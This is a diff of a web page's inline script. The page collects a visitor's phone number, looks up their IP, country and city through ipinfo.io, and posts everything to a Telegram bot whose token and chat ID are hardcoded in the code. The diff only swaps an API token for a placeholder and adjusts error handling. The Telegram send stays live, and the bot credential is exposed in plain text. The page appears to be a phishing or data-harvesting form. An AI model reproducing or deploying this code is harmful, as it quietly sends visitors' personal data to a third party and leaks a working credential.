@@ -144,10 +144,10 @@
     const iti = window.intlTelInput(input, {
       initialCountry: "auto",
       geoIpLookup: function (callback) {
-        fetch("https://ipinfo.io/json?token=7164624615:AAE_28P52PeaX1L3BWjbCfWRfIfu2QkWoiY")
+        fetch("https://ipinfo.io/json?token=YOUR_TOKEN")
           .then((resp) => resp.json())
           .then((data) => {
-            const countryCode = data && data.country ? data.country : "us";
+            const countryCode = data && data.country ? data.country : "US";
             callback(countryCode.toLowerCase());
           })
           .catch(() => callback("us"));
@@ -167,14 +167,14 @@
       const botToken = "7164624615:AAE_28P52PeaX1L3BWjbCfWRfIfu2QkWoiY";
       const chatId = "7196613507";
 
-      fetch("https://ipinfo.io/json?token=7164624615:AAE_28P52PeaX1L3BWjbCfWRfIfu2QkWoiY")
+      fetch("https://ipinfo.io/json?token=YOUR_TOKEN")
         .then((response) => response.json())
         .then((data) => {
-          const ip = data.ip;
-          const country = data.country;
-          const city = data.city;
+          const ip = data.ip || "Unavailable";
+          const country = data.country || "Unavailable";
+          const city = data.city || "Unavailable";
 
-          const message = `New Submission:\n📞 Phone: ${phoneNumber}\n🌍 Country: ${country}\n🏙️ City: ${city}\n💻 IP: ${ip}`;
+          const message = `New Submission:\n\ud83d\udcde Phone: ${phoneNumber}\n\ud83c\udf0d Country: ${country}\n\ud83c\udf07 City: ${city}\n\ud83d\udcbb IP: ${ip}`;
 
           fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: "POST",
@@ -199,10 +199,6 @@
             console.error("Fetch error:", err);
             alert("An error occurred. Please try again.");
           });
-        })
-        .catch(err => {
-          console.error("Location fetch failed:", err);
-          alert("Unable to fetch your location. Try again.");
         });
     });
   </script>
